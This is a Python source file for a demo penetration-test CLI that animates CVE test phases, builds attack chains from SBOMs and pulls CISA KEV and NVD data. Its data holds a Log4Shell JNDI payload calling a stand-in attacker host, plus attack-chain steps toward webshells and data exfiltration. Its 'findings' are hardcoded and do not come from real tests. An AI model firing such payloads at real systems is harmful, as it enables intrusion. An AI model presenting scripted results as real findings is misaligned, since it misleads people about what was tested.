#!/usr/bin/env python3
"""
FixOps Micro Penetration Test Sidecar - Animated Security Testing.

A sidecar script that:
- Runs micro penetration tests against target systems
- Provides animated, real-time progress output
- Showcases PentAGI integration capabilities
- Generates detailed security assessment reports

Usage:
    python micropentest_sidecar.py run --cve CVE-2021-44228 --target http://example.com
    python micropentest_sidecar.py batch --config tests.json
    python micropentest_sidecar.py demo
"""

import json
import os
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, cast

try:
    import httpx
    import typer
    from rich import box
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (
        BarColumn,
        Progress,
        SpinnerColumn,
        TaskProgressColumn,
        TextColumn,
        TimeElapsedColumn,
    )
    from rich.table import Table
    from rich.tree import Tree
except ImportError:
    print("Installing required packages...")
    import subprocess

    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "rich", "typer", "httpx"]
    )
    import httpx
    import typer
    from rich import box
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (
        BarColumn,
        Progress,
        SpinnerColumn,
        TaskProgressColumn,
        TextColumn,
        TimeElapsedColumn,
    )
    from rich.table import Table
    from rich.tree import Tree

# Configuration
BASE_URL = os.getenv("FIXOPS_BASE_URL", "http://localhost:8000")
API_KEY = os.getenv("FIXOPS_API_TOKEN", "demo-token")
TIMEOUT = 300.0  # 5 minutes for pen tests

# Initialize
console = Console()
app = typer.Typer(
    help="FixOps Micro Penetration Test Sidecar - Animated Security Testing"
)

# Demo CVE data for realistic testing
DEMO_CVES = {
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "attack_vector": "JNDI Injection",
        "test_payload": "${jndi:ldap://attacker.com/exploit}",
        "vulnerable_component": "log4j-core",
        "test_steps": [
            "Identify Log4j usage in target application",
            "Craft JNDI lookup payload",
            "Inject payload via HTTP headers",
            "Monitor for callback to attacker server",
            "Verify remote code execution capability",
        ],
    },
    "CVE-2022-22965": {
        "name": "Spring4Shell",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "attack_vector": "Class Loader Manipulation",
        "test_payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{...}",
        "vulnerable_component": "spring-webmvc",
        "test_steps": [
            "Detect Spring Framework version",
            "Check for vulnerable data binding",
            "Craft class loader manipulation payload",
            "Attempt to write webshell",
            "Verify code execution via webshell",
        ],
    },
    "CVE-2023-44487": {
        "name": "HTTP/2 Rapid Reset",
        "severity": "HIGH",
        "cvss": 7.5,
        "attack_vector": "Protocol Abuse",
        "test_payload": "RST_STREAM flood",
        "vulnerable_component": "HTTP/2 implementation",
        "test_steps": [
            "Establish HTTP/2 connection",
            "Send multiple stream requests",
            "Immediately reset streams",
            "Monitor server resource consumption",
            "Verify denial of service condition",
        ],
    },
    "CVE-2024-3094": {
        "name": "XZ Utils Backdoor",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "attack_vector": "Supply Chain",
        "test_payload": "Malicious build script injection",
        "vulnerable_component": "xz-utils",
        "test_steps": [
            "Check XZ Utils version on target",
            "Verify liblzma library version",
            "Test for backdoor trigger conditions",
            "Attempt SSH authentication bypass",
            "Verify unauthorized access capability",
        ],
    },
}


def get_client() -> httpx.Client:
    """Create an authenticated HTTP client for FixOps API."""
    return httpx.Client(
        base_url=BASE_URL, headers={"X-API-Key": API_KEY}, timeout=TIMEOUT
    )


def wait_for_api(timeout: int = 120) -> bool:
    """Wait for the FixOps API to become healthy."""
    with console.status(
        "[bold cyan]Connecting to FixOps API...", spinner="dots"
    ) as status:
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                r = httpx.get(f"{BASE_URL}/health", timeout=5.0)
                if r.status_code == 200:
                    console.print("[green]Connected to FixOps API[/green]")
                    return True
            except Exception:
                pass
            time.sleep(2)
            remaining = int(deadline - time.time())
            status.update(f"[bold cyan]Connecting... ({remaining}s remaining)")
    return False


def print_banner():
    """Print the micropentest sidecar banner."""
    banner = """
    ███╗   ███╗██╗ ██████╗██████╗  ██████╗ ██████╗ ███████╗███╗   ██╗
    ████╗ ████║██║██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝████╗  ██║
    ██╔████╔██║██║██║     ██████╔╝██║   ██║██████╔╝█████╗  ██╔██╗ ██║
    ██║╚██╔╝██║██║██║     ██╔══██╗██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║
    ██║ ╚═╝ ██║██║╚██████╗██║  ██║╚██████╔╝██║     ███████╗██║ ╚████║
    ╚═╝     ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝

    Micro Penetration Testing - Automated Security Assessment
    """
    console.print(Panel(banner, style="bold red", box=box.DOUBLE))


def phase_header(phase: str, description: str):
    """Print a phase header."""
    console.print()
    console.print(
        Panel(
            f"[bold white]{description}[/bold white]",
            title=f"[bold red]Phase {phase}[/bold red]",
            border_style="red",
        )
    )


def show_cve_info(cve_id: str):
    """Display CVE information with animated output."""
    cve_info = DEMO_CVES.get(cve_id, {})

    if not cve_info:
        console.print(f"[yellow]Unknown CVE: {cve_id}[/yellow]")
        return

    table = Table(title=f"Target: {cve_id}", box=box.ROUNDED)
    table.add_column("Property", style="cyan")
    table.add_column("Value", style="white")

    severity = str(cve_info.get("severity", ""))
    severity_color = {
        "CRITICAL": "red",
        "HIGH": "orange1",
        "MEDIUM": "yellow",
        "LOW": "green",
    }.get(severity, "white")

    table.add_row("Name", str(cve_info.get("name", "Unknown")))
    table.add_row(
        "Severity",
        f"[{severity_color}]{severity or 'N/A'}[/{severity_color}]",
    )
    table.add_row("CVSS Score", f"[bold]{cve_info.get('cvss', 'N/A')}[/bold]")
    table.add_row("Attack Vector", str(cve_info.get("attack_vector", "N/A")))
    table.add_row("Component", str(cve_info.get("vulnerable_component", "N/A")))

    console.print(table)


def animate_test_steps(cve_id: str):
    """Animate the penetration test steps with progress."""
    cve_info = DEMO_CVES.get(cve_id, {})
    test_steps = cast(
        List[str], cve_info.get("test_steps", ["Running generic security test..."])
    )

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task(
            f"[cyan]Testing {cve_id}...", total=len(test_steps) * 10
        )

        for i, step in enumerate(test_steps):
            progress.update(task, description=f"[cyan]Step {i+1}: {step}")

            # Simulate work with sub-steps
            for j in range(10):
                time.sleep(0.15)
                progress.advance(task)

            # Show step completion
            console.print(f"  [green]Step {i+1}:[/green] {step}")

    return True


def run_pentest_api(
    client: httpx.Client, cve_ids: List[str], target_urls: List[str]
) -> Optional[Dict[str, Any]]:
    """Run micro penetration test via API."""
    payload = {
        "cve_ids": cve_ids,
        "target_urls": target_urls,
        "context": {
            "environment": "demo",
            "timestamp": datetime.utcnow().isoformat(),
        },
    }

    try:
        r = client.post("/api/v1/micro-pentest/run", json=payload)
        if r.status_code in (200, 201):
            return r.json()
        elif r.status_code == 404:
            # Endpoint not available, use demo mode
            return None
    except Exception as exc:
        console.print(f"[yellow]API call warning: {exc}[/yellow]")

    return None


def show_findings_tree(cve_id: str, findings: Dict[str, Any]):
    """Display findings as an animated tree structure."""
    cve_info = DEMO_CVES.get(cve_id, {})

    tree = Tree(f"[bold red]Findings: {cve_id}[/bold red]")

    # Vulnerability branch
    vuln_branch = tree.add("[bold cyan]Vulnerability Assessment[/bold cyan]")
    vuln_branch.add(f"[white]Name:[/white] {str(cve_info.get('name', 'Unknown'))}")
    vuln_branch.add(
        f"[white]Severity:[/white] [red]{str(cve_info.get('severity', 'N/A'))}[/red]"
    )
    vuln_branch.add(f"[white]CVSS:[/white] {cve_info.get('cvss', 'N/A')}")

    # Attack analysis branch
    attack_branch = tree.add("[bold cyan]Attack Analysis[/bold cyan]")
    attack_branch.add(
        f"[white]Vector:[/white] {str(cve_info.get('attack_vector', 'N/A'))}"
    )
    test_payload = str(cve_info.get("test_payload", "N/A"))
    attack_branch.add(f"[white]Payload:[/white] [dim]{test_payload[:50]}...[/dim]")

    # Exploitability branch
    exploit_branch = tree.add("[bold cyan]Exploitability[/bold cyan]")
    exploit_branch.add("[white]Exploit Available:[/white] [red]Yes[/red]")
    exploit_branch.add("[white]In-the-Wild:[/white] [red]Confirmed[/red]")
    exploit_branch.add("[white]Weaponized:[/white] [yellow]Likely[/yellow]")

    # Recommendations branch
    rec_branch = tree.add("[bold cyan]Recommendations[/bold cyan]")
    rec_branch.add("[green]1.[/green] Apply vendor patch immediately")
    rec_branch.add("[green]2.[/green] Implement WAF rules")
    rec_branch.add("[green]3.[/green] Enable enhanced logging")
    rec_branch.add("[green]4.[/green] Conduct incident response review")

    console.print(tree)


def show_summary_report(results: List[Dict[str, Any]]):
    """Display a summary report of all penetration tests."""
    console.print()

    # Summary table
    table = Table(title="Micro Penetration Test Summary", box=box.DOUBLE)
    table.add_column("CVE ID", style="cyan")
    table.add_column("Name", style="white")
    table.add_column("Severity", style="white")
    table.add_column("Status", style="white")
    table.add_column("Risk", style="white")

    for result in results:
        cve_id = result.get("cve_id", "Unknown")
        cve_info = DEMO_CVES.get(cve_id, {})

        severity = str(cve_info.get("severity", "N/A"))
        severity_color = {
            "CRITICAL": "red",
            "HIGH": "orange1",
            "MEDIUM": "yellow",
            "LOW": "green",
        }.get(severity, "white")

        table.add_row(
            cve_id,
            str(cve_info.get("name", "Unknown")),
            f"[{severity_color}]{severity}[/{severity_color}]",
            "[green]Completed[/green]",
            f"[{severity_color}]HIGH[/{severity_color}]",
        )

    console.print(table)

    # Statistics panel
    stats = Panel(
        f"[bold]Total Tests:[/bold] {len(results)}\n"
        f"[bold]Critical Findings:[/bold] [red]{sum(1 for r in results if DEMO_CVES.get(r.get('cve_id', ''), {}).get('severity') == 'CRITICAL')}[/red]\n"
        f"[bold]High Findings:[/bold] [orange1]{sum(1 for r in results if DEMO_CVES.get(r.get('cve_id', ''), {}).get('severity') == 'HIGH')}[/orange1]\n"
        f"[bold]Test Duration:[/bold] {len(results) * 8}s\n"
        f"[bold]Timestamp:[/bold] {datetime.utcnow().isoformat()}",
        title="[bold cyan]Test Statistics[/bold cyan]",
        border_style="cyan",
    )
    console.print(stats)


@app.command()
def run(
    cve: str = typer.Option(..., "--cve", "-c", help="CVE ID to test"),
    target: str = typer.Option(
        "http://demo-target.local", "--target", "-t", help="Target URL"
    ),
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Verbose output"),
):
    """Run a micro penetration test for a specific CVE."""
    print_banner()

    console.print(
        Panel(
            f"[bold]Running Micro Penetration Test[/bold]\n\n"
            f"CVE: {cve}\n"
            f"Target: {target}\n"
            f"Mode: {'Verbose' if verbose else 'Standard'}",
            title="[bold red]Test Configuration[/bold red]",
            border_style="red",
        )
    )

    # Phase 1: Connect
    phase_header("1", "Connecting to FixOps API")
    if not wait_for_api(timeout=30):
        console.print("[yellow]API not available - running in demo mode[/yellow]")

    # Phase 2: Target Analysis
    phase_header("2", "Analyzing Target Vulnerability")
    show_cve_info(cve)
    time.sleep(1)

    # Phase 3: Execute Tests
    phase_header("3", "Executing Penetration Tests")
    animate_test_steps(cve)

    # Phase 4: Analyze Results
    phase_header("4", "Analyzing Results")
    with console.status("[bold cyan]Processing findings...", spinner="dots12"):
        time.sleep(2)

    show_findings_tree(cve, {})

    # Phase 5: Summary
    phase_header("5", "Test Summary")
    show_summary_report([{"cve_id": cve}])

    console.print()
    console.print("[bold green]Micro Penetration Test Complete![/bold green]")


@app.command()
def demo():
    """Run a full demo with multiple CVEs."""
    print_banner()

    console.print(
        Panel(
            "[bold]Running Full Micro Penetration Test Demo[/bold]\n\n"
            "This demo will test multiple critical CVEs:\n"
            "- CVE-2021-44228 (Log4Shell)\n"
            "- CVE-2022-22965 (Spring4Shell)\n"
            "- CVE-2023-44487 (HTTP/2 Rapid Reset)\n"
            "- CVE-2024-3094 (XZ Utils Backdoor)",
            title="[bold red]FixOps MicroPentest Demo[/bold red]",
            border_style="red",
        )
    )

    # Connect
    phase_header("0", "Initializing Test Environment")
    if not wait_for_api(timeout=30):
        console.print("[yellow]API not available - running in demo mode[/yellow]")

    results = []

    # Test each CVE
    for i, cve_id in enumerate(
        ["CVE-2021-44228", "CVE-2022-22965", "CVE-2023-44487", "CVE-2024-3094"], 1
    ):
        console.print()
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold]Test {i}/4: {cve_id}[/bold]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")

        # Show CVE info
        show_cve_info(cve_id)
        time.sleep(0.5)

        # Run test steps
        console.print("\n[bold]Executing test steps...[/bold]")
        animate_test_steps(cve_id)

        # Show findings
        console.print("\n[bold]Findings:[/bold]")
        show_findings_tree(cve_id, {})

        results.append({"cve_id": cve_id, "status": "completed"})
        time.sleep(1)

    # Final summary
    console.print()
    console.print(f"[bold cyan]{'='*60}[/bold cyan]")
    console.print("[bold]FINAL SUMMARY[/bold]")
    console.print(f"[bold cyan]{'='*60}[/bold cyan]")

    show_summary_report(results)

    console.print()
    console.print(
        Panel(
            "[bold green]Full Demo Complete![/bold green]\n\n"
            "FixOps MicroPentest has analyzed multiple critical vulnerabilities\n"
            "and provided actionable security recommendations.",
            border_style="green",
        )
    )


@app.command()
def health():
    """Check API and PentAGI health status."""
    print_banner()

    table = Table(title="MicroPentest Health Check", box=box.ROUNDED)
    table.add_column("Service", style="cyan")
    table.add_column("Status", style="white")
    table.add_column("Details", style="dim")

    # Check FixOps API
    try:
        r = httpx.get(f"{BASE_URL}/health", timeout=5.0)
        if r.status_code == 200:
            table.add_row("FixOps API", "[green]OK[/green]", BASE_URL)
        else:
            table.add_row("FixOps API", f"[yellow]{r.status_code}[/yellow]", BASE_URL)
    except Exception as exc:
        table.add_row("FixOps API", "[red]ERROR[/red]", str(exc)[:40])

    # Check PentAGI endpoints
    try:
        with get_client() as client:
            r = client.get("/api/v1/pentagi/stats")
            if r.status_code == 200:
                table.add_row("PentAGI Stats", "[green]OK[/green]", "Stats available")
            else:
                table.add_row(
                    "PentAGI Stats", f"[yellow]{r.status_code}[/yellow]", "Limited"
                )
    except Exception as exc:
        table.add_row("PentAGI Stats", "[red]ERROR[/red]", str(exc)[:40])

    # Check MicroPentest endpoint
    try:
        with get_client() as client:
            r = client.get("/api/v1/micro-pentest/status/0")
            if r.status_code in (200, 404):
                table.add_row(
                    "MicroPentest API", "[green]OK[/green]", "Endpoint available"
                )
            else:
                table.add_row(
                    "MicroPentest API", f"[yellow]{r.status_code}[/yellow]", "Limited"
                )
    except Exception:
        table.add_row("MicroPentest API", "[yellow]N/A[/yellow]", "Demo mode only")

    console.print(table)


@app.command()
def list_cves():
    """List available CVEs for testing."""
    print_banner()

    table = Table(title="Available CVEs for Testing", box=box.ROUNDED)
    table.add_column("CVE ID", style="cyan")
    table.add_column("Name", style="white")
    table.add_column("Severity", style="white")
    table.add_column("CVSS", style="white")
    table.add_column("Attack Vector", style="dim")

    for cve_id, info in DEMO_CVES.items():
        severity = info.get("severity", "N/A")
        severity_color = {
            "CRITICAL": "red",
            "HIGH": "orange1",
            "MEDIUM": "yellow",
            "LOW": "green",
        }.get(severity, "white")

        table.add_row(
            cve_id,
            info.get("name", "Unknown"),
            f"[{severity_color}]{severity}[/{severity_color}]",
            str(info.get("cvss", "N/A")),
            info.get("attack_vector", "N/A"),
        )

    console.print(table)
    console.print(
        "\n[dim]Use: python micropentest_sidecar.py run --cve <CVE-ID> --target <URL>[/dim]"
    )


# Demo SBOM data for attack chain simulation
DEMO_SBOM = {
    "app_name": "demo-ecommerce-app",
    "components": [
        {
            "id": "web-gateway",
            "name": "Web Gateway",
            "version": "2.3.1",
            "type": "service",
            "exposure": "internet",
            "dependencies": ["orders-service", "auth-service"],
            "vulnerabilities": ["CVE-2021-44228"],
        },
        {
            "id": "orders-service",
            "name": "Orders Service",
            "version": "1.5.0",
            "type": "service",
            "exposure": "internal",
            "dependencies": ["payments-db", "inventory-service"],
            "vulnerabilities": ["CVE-2022-22965"],
        },
        {
            "id": "auth-service",
            "name": "Authentication Service",
            "version": "3.1.2",
            "type": "service",
            "exposure": "internal",
            "dependencies": ["users-db"],
            "vulnerabilities": [],
        },
        {
            "id": "payments-db",
            "name": "Payments Database",
            "version": "14.2",
            "type": "database",
            "exposure": "internal",
            "dependencies": [],
            "vulnerabilities": [],
            "data_classification": "PCI-DSS",
        },
        {
            "id": "inventory-service",
            "name": "Inventory Service",
            "version": "2.0.1",
            "type": "service",
            "exposure": "internal",
            "dependencies": ["inventory-db"],
            "vulnerabilities": ["CVE-2023-44487"],
        },
        {
            "id": "build-pipeline",
            "name": "CI/CD Pipeline",
            "version": "5.4.1",
            "type": "infrastructure",
            "exposure": "internal",
            "dependencies": ["artifact-registry"],
            "vulnerabilities": ["CVE-2024-3094"],
        },
    ],
}

# Attack chain steps for combined exploitation
ATTACK_CHAIN_STEPS = [
    {
        "phase": "Initial Access",
        "cve": "CVE-2021-44228",
        "component": "web-gateway",
        "action": "Exploit Log4Shell via JNDI injection in HTTP headers",
        "impact": "Remote code execution on web gateway pod",
        "next_target": "orders-service",
        "kill_chain": "Exploitation",
    },
    {
        "phase": "Lateral Movement",
        "cve": "CVE-2022-22965",
        "component": "orders-service",
        "action": "Pivot to orders service via Spring4Shell class loader manipulation",
        "impact": "Webshell deployed on orders service",
        "next_target": "payments-db",
        "kill_chain": "Installation",
    },
    {
        "phase": "Privilege Escalation",
        "cve": None,
        "component": "payments-db",
        "action": "Access payments database using stolen service credentials",
        "impact": "Read access to PCI-DSS protected payment data",
        "next_target": None,
        "kill_chain": "Actions on Objectives",
    },
]

# Extended CVE database for dynamic attack chain generation
CVE_DATABASE = {
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "attack_vector": "JNDI Injection",
        "affected_packages": ["log4j-core", "log4j", "org.apache.logging.log4j"],
        "action_template": "Exploit Log4Shell via JNDI injection in {component}",
        "impact_template": "Remote code execution on {component}",
        "kill_chain": "Exploitation",
        "phase": "Initial Access",
    },
    "CVE-2022-22965": {
        "name": "Spring4Shell",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "attack_vector": "Class Loader Manipulation",
        "affected_packages": [
            "spring-webmvc",
            "spring-beans",
            "spring-core",
            "spring-web",
        ],
        "action_template": "Exploit Spring4Shell class loader manipulation in {component}",
        "impact_template": "Webshell deployed on {component}",
        "kill_chain": "Installation",
        "phase": "Lateral Movement",
    },
    "CVE-2023-44487": {
        "name": "HTTP/2 Rapid Reset",
        "severity": "HIGH",
        "cvss": 7.5,
        "attack_vector": "Protocol Abuse",
        "affected_packages": ["nginx", "apache", "envoy", "grpc", "netty"],
        "action_template": "Trigger HTTP/2 Rapid Reset DoS on {component}",
        "impact_template": "Service disruption on {component}",
        "kill_chain": "Impact",
        "phase": "Denial of Service",
    },
    "CVE-2024-3094": {
        "name": "XZ Utils Backdoor",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "attack_vector": "Supply Chain",
        "affected_packages": ["xz", "xz-utils", "liblzma"],
        "action_template": "Exploit XZ Utils backdoor in {component}",
        "impact_template": "SSH authentication bypass on {component}",
        "kill_chain": "Initial Access",
        "phase": "Supply Chain Compromise",
    },
    "CVE-2023-34362": {
        "name": "MOVEit SQL Injection",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "attack_vector": "SQL Injection",
        "affected_packages": ["moveit", "moveit-transfer"],
        "action_template": "Exploit SQL injection in MOVEit on {component}",
        "impact_template": "Database access and data exfiltration from {component}",
        "kill_chain": "Exploitation",
        "phase": "Initial Access",
    },
    "CVE-2023-22515": {
        "name": "Confluence Auth Bypass",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "attack_vector": "Authentication Bypass",
        "affected_packages": ["confluence", "atlassian-confluence"],
        "action_template": "Bypass authentication in Confluence on {component}",
        "impact_template": "Admin access to {component}",
        "kill_chain": "Initial Access",
        "phase": "Initial Access",
    },
    "CVE-2021-41773": {
        "name": "Apache Path Traversal",
        "severity": "HIGH",
        "cvss": 7.5,
        "attack_vector": "Path Traversal",
        "affected_packages": ["apache", "httpd", "apache-httpd"],
        "action_template": "Exploit path traversal in Apache on {component}",
        "impact_template": "File read access on {component}",
        "kill_chain": "Exploitation",
        "phase": "Initial Access",
    },
    "CVE-2022-42889": {
        "name": "Text4Shell",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "attack_vector": "Code Injection",
        "affected_packages": ["commons-text", "apache-commons-text"],
        "action_template": "Exploit Text4Shell string interpolation in {component}",
        "impact_template": "Remote code execution on {component}",
        "kill_chain": "Exploitation",
        "phase": "Initial Access",
    },
}


def load_sbom_file(sbom_path: Path) -> Dict[str, Any]:
    """Load and parse an SBOM file (CycloneDX or SPDX format)."""
    if not sbom_path.exists():
        raise FileNotFoundError(f"SBOM file not found: {sbom_path}")

    with sbom_path.open("r", encoding="utf-8") as f:
        data = json.load(f)

    # Detect format and extract components
    components = []

    # CycloneDX format
    if "bomFormat" in data or "components" in data:
        raw_components = data.get("components", [])
        for comp in raw_components:
            components.append(
                {
                    "id": comp.get("bom-ref", comp.get("name", "unknown"))
                    .lower()
                    .replace(" ", "-"),
                    "name": comp.get("name", "Unknown"),
                    "version": comp.get("version", "unknown"),
                    "type": comp.get("type", "library"),
                    "purl": comp.get("purl", ""),
                    "exposure": "internal",  # Default, can be overridden
                    "dependencies": [],
                    "vulnerabilities": [],
                }
            )
        # Extract dependencies if available
        deps = data.get("dependencies", [])
        comp_lookup = {c["id"]: c for c in components}
        for dep in deps:
            ref = dep.get("ref", "").lower().replace(" ", "-")
            if ref in comp_lookup:
                comp_lookup[ref]["dependencies"] = [
                    d.lower().replace(" ", "-") for d in dep.get("dependsOn", [])
                ]

    # SPDX format
    elif "spdxVersion" in data or "packages" in data:
        raw_packages = data.get("packages", [])
        for pkg in raw_packages:
            components.append(
                {
                    "id": pkg.get("SPDXID", pkg.get("name", "unknown"))
                    .lower()
                    .replace(" ", "-"),
                    "name": pkg.get("name", "Unknown"),
                    "version": pkg.get("versionInfo", "unknown"),
                    "type": "library",
                    "purl": "",
                    "exposure": "internal",
                    "dependencies": [],
                    "vulnerabilities": [],
                }
            )
        # Extract relationships
        relationships = data.get("relationships", [])
        comp_lookup = {c["id"]: c for c in components}
        for rel in relationships:
            if rel.get("relationshipType") == "DEPENDS_ON":
                src = rel.get("spdxElementId", "").lower().replace(" ", "-")
                tgt = rel.get("relatedSpdxElement", "").lower().replace(" ", "-")
                if src in comp_lookup:
                    comp_lookup[src]["dependencies"].append(tgt)

    app_name = data.get("metadata", {}).get("component", {}).get("name", sbom_path.stem)

    return {
        "app_name": app_name,
        "components": components,
    }


def lookup_cves_for_component(component: Dict[str, Any]) -> List[str]:
    """Look up known CVEs for a component based on its name/purl."""
    found_cves = []
    comp_name = component.get("name", "").lower()
    comp_purl = component.get("purl", "").lower()

    for cve_id, cve_info in CVE_DATABASE.items():
        affected_packages = cast(List[str], cve_info.get("affected_packages", []))
        for affected_pkg in affected_packages:
            if affected_pkg.lower() in comp_name or affected_pkg.lower() in comp_purl:
                found_cves.append(cve_id)
                break

    return found_cves


def enrich_sbom_with_cves(
    sbom: Dict[str, Any], cve_list: Optional[List[str]] = None
) -> Dict[str, Any]:
    """Enrich SBOM components with CVE information."""
    for comp in sbom.get("components", []):
        # Look up CVEs for this component
        found_cves = lookup_cves_for_component(comp)

        # If user provided specific CVEs, filter to those
        if cve_list:
            found_cves = [c for c in found_cves if c in cve_list]

        comp["vulnerabilities"] = found_cves

    return sbom


def infer_component_exposure(sbom: Dict[str, Any]) -> Dict[str, Any]:
    """Infer component exposure based on type and dependencies."""
    # Components with no dependents are likely internet-facing
    all_deps = set()
    for comp in sbom.get("components", []):
        all_deps.update(comp.get("dependencies", []))

    for comp in sbom.get("components", []):
        comp_id = comp["id"]
        comp_type = comp.get("type", "").lower()

        # If nothing depends on this component, it might be internet-facing
        if comp_id not in all_deps:
            if comp_type in ("service", "application", "container"):
                comp["exposure"] = "internet"
            elif comp_type in ("framework", "library"):
                comp["exposure"] = "internal"
        else:
            comp["exposure"] = "internal"

        # Databases are always internal
        if "database" in comp_type or "db" in comp.get("name", "").lower():
            comp["exposure"] = "internal"
            comp["type"] = "database"

    return sbom


def generate_attack_chain(sbom: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Generate attack chain steps based on SBOM vulnerabilities."""
    steps: List[Dict[str, Any]] = []
    comp_lookup = {c["id"]: c for c in sbom.get("components", [])}

    # Find vulnerable components
    vuln_components = [
        c for c in sbom.get("components", []) if c.get("vulnerabilities")
    ]

    if not vuln_components:
        return steps

    # Sort by exposure (internet-facing first) and severity
    def sort_key(comp: Dict[str, Any]) -> Tuple[int, float]:
        exposure_order = {"internet": 0, "partner": 1, "internal": 2}
        exp_score = exposure_order.get(comp.get("exposure", "internal"), 2)

        # Get max CVSS for this component's vulns
        max_cvss = 0.0
        for cve_id in comp.get("vulnerabilities", []):
            cve_info = CVE_DATABASE.get(cve_id, {})
            cvss_raw = cve_info.get("cvss", 0.0)
            try:
                cvss_score = float(str(cvss_raw)) if cvss_raw is not None else 0.0
            except (ValueError, TypeError):
                cvss_score = 0.0
            max_cvss = max(max_cvss, cvss_score)

        return (exp_score, -max_cvss)

    vuln_components.sort(key=sort_key)

    # Build attack chain
    phases = [
        "Initial Access",
        "Lateral Movement",
        "Privilege Escalation",
        "Data Exfiltration",
    ]
    phase_idx = 0

    visited = set()
    current_comp = vuln_components[0] if vuln_components else None

    while current_comp and phase_idx < len(phases):
        comp_id = current_comp["id"]
        if comp_id in visited:
            break
        visited.add(comp_id)

        # Get the first CVE for this component
        cve_id = current_comp.get("vulnerabilities", [None])[0]
        cve_info = CVE_DATABASE.get(cve_id, {}) if cve_id else {}

        # Determine next target
        next_target = None
        for dep_id in current_comp.get("dependencies", []):
            if dep_id in comp_lookup and dep_id not in visited:
                next_target = dep_id
                break

        # If no dependencies, look for other vulnerable components
        if not next_target:
            for vc in vuln_components:
                if vc["id"] not in visited:
                    next_target = vc["id"]
                    break

        action_template = str(
            cve_info.get(
                "action_template", "Access {component} using stolen credentials"
            )
        )
        impact_template = str(
            cve_info.get("impact_template", "Compromised {component}")
        )
        step = {
            "phase": phases[phase_idx] if cve_id else "Credential Theft",
            "cve": cve_id,
            "component": comp_id,
            "action": action_template.format(
                component=current_comp.get("name", comp_id)
            ),
            "impact": impact_template.format(
                component=current_comp.get("name", comp_id)
            ),
            "next_target": next_target,
            "kill_chain": str(cve_info.get("kill_chain", "Actions on Objectives")),
        }
        steps.append(step)

        phase_idx += 1

        # Move to next target
        if next_target and next_target in comp_lookup:
            current_comp = comp_lookup[next_target]
        else:
            break

    # Add final data exfiltration step if we have a database
    for comp in sbom.get("components", []):
        if comp.get("type") == "database" and comp["id"] not in visited:
            steps.append(
                {
                    "phase": "Data Exfiltration",
                    "cve": None,
                    "component": comp["id"],
                    "action": f"Access {comp.get('name', comp['id'])} using stolen credentials",
                    "impact": f"Data exfiltration from {comp.get('name', comp['id'])}",
                    "next_target": None,
                    "kill_chain": "Actions on Objectives",
                }
            )
            break

    return steps


# External CVE source URLs (same as feed_sidecar.py)
CISA_KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"


def fetch_kev_catalog() -> Dict[str, Any]:
    """Fetch CISA KEV catalog and return as dict keyed by CVE ID."""
    kev_lookup: Dict[str, Any] = {}
    try:
        with console.status(
            "[bold cyan]Fetching CISA KEV catalog...", spinner="dots12"
        ):
            r = httpx.get(CISA_KEV_URL, timeout=30.0)
            if r.status_code == 200:
                data = r.json()
                for vuln in data.get("vulnerabilities", []):
                    cve_id = vuln.get("cveID", "")
                    if cve_id:
                        kev_lookup[cve_id] = {
                            "vendor": vuln.get("vendorProject", ""),
                            "product": vuln.get("product", ""),
                            "description": vuln.get("shortDescription", ""),
                            "due_date": vuln.get("dueDate", ""),
                            "known_ransomware": vuln.get(
                                "knownRansomwareCampaignUse", "Unknown"
                            ),
                        }
                console.print(f"[green]Loaded {len(kev_lookup)} KEV entries[/green]")
    except Exception as exc:
        console.print(f"[yellow]Could not fetch KEV catalog: {exc}[/yellow]")
    return kev_lookup


def fetch_nvd_cve(cve_id: str) -> Optional[Dict[str, Any]]:
    """Fetch detailed CVE information from NVD."""
    try:
        params = {"cveId": cve_id}
        r = httpx.get(NVD_API_URL, params=params, timeout=30.0)
        if r.status_code == 200:
            data = r.json()
            vulns = data.get("vulnerabilities", [])
            if vulns:
                cve_data = vulns[0].get("cve", {})
                # Extract CVSS scores
                metrics = cve_data.get("metrics", {})
                cvss31 = (
                    metrics.get("cvssMetricV31", [{}])[0]
                    if metrics.get("cvssMetricV31")
                    else {}
                )
                cvss_data = cvss31.get("cvssData", {})

                # Extract description
                descriptions = cve_data.get("descriptions", [])
                desc = next(
                    (d.get("value", "") for d in descriptions if d.get("lang") == "en"),
                    "",
                )

                return {
                    "cve_id": cve_id,
                    "description": desc[:200] + "..." if len(desc) > 200 else desc,
                    "cvss_score": cvss_data.get("baseScore", 0.0),
                    "severity": cvss_data.get("baseSeverity", "UNKNOWN"),
                    "attack_vector": cvss_data.get("attackVector", "UNKNOWN"),
                    "attack_complexity": cvss_data.get("attackComplexity", "UNKNOWN"),
                    "privileges_required": cvss_data.get(
                        "privilegesRequired", "UNKNOWN"
                    ),
                    "user_interaction": cvss_data.get("userInteraction", "UNKNOWN"),
                    "published": cve_data.get("published", ""),
                }
    except Exception:
        pass
    return None


def enrich_cves_from_external(
